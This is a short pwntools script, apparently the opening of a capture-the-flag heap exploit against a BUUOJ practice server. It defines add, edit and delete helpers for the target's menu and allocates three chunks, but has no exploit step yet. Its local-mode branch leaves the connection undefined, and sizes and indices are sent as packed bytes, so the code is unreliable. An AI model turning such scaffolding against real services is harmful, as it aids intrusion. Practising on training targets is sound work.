from pwn import *

if __name__ == '__main__':
    local = sys.argv[1]
    if local == '1':
        #ENV = {'LD_PRELOAD':'/home/linbei/桌面/pwn/libc/ubuntu16-64/libc-2.23.so'}
        #r = process(['/home/linbei/桌面/pwn/libc/ubuntu16-64/libc-2.23.so','./pwn'], env=ENV)
        #elf = ELF('./pwn')
        #libc = elf.libc
        print("null")
    else:
        r = remote('node5.buuoj.cn', 26908)
        elf = ELF('./pwn')
        libc = elf.libc

def add(size, content):
    r.sendlineafter(b'Your choice :', b'1')
    r.sendlineafter(b'Size of Heap :', p64(size))
    r.sendlineafter(b'Content of heap:', content)

def edit(index, size, content):
    r.sendlineafter(b'Your choice :', b'2')
    r.sendlineafter(b'Index :', p64(index))
    r.sendlineafter(b'Size of Heap :', p64(size))
    r.sendlineafter(b'Content of heap :', content)

def delete(index):
    r.sendlineafter(b'Your choice :', b'3')
    r.sendlineafter(b'Index :', p64(index))

add(0x10, b'aaaaaaaa') # 0
add(0x10, b'bbbbbbbb') # 1
add(0x10, b'cccccccc') # 2

pause()

r.interactive()

